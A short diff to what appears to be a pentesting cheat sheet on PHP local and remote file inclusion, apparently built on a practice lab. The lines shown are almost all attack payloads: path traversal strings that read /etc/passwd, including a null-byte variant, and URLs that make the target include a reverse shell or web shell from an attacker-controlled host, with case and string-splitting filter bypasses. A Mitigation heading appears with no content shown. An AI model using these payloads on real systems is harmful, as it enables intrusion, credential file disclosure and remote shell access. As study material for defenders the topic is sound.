@@ -2,7 +2,8 @@
 
 ## Local
 - Exploit
-  - Modify ```?page=include.php``` to ```?page=../../../../../etc/passwd```
+  - ```?page=../../../../../etc/passwd```
+  - ```index.php?page=../../../../../../../../../../etc/passwd%00```
 
 - Intersting files
   - ```/proc/self/environ```
@@ -15,8 +16,8 @@
 ## Remote
 - Exploit
   - ```http://127.0.0.1/vulnerabilities/fi/?page=http://192.168.72.200:9999/php-reverse-shell.php```
-
-- Bypass
+  - ```index.php?page=http://attackerIP/webshell.php``` 
+  - ```index.php?page=htthttpp://attackerIP/webshell.php```
   - ```?page=hTTp://10.20.14.203/reverse.txt?```
 
 - Mitigation
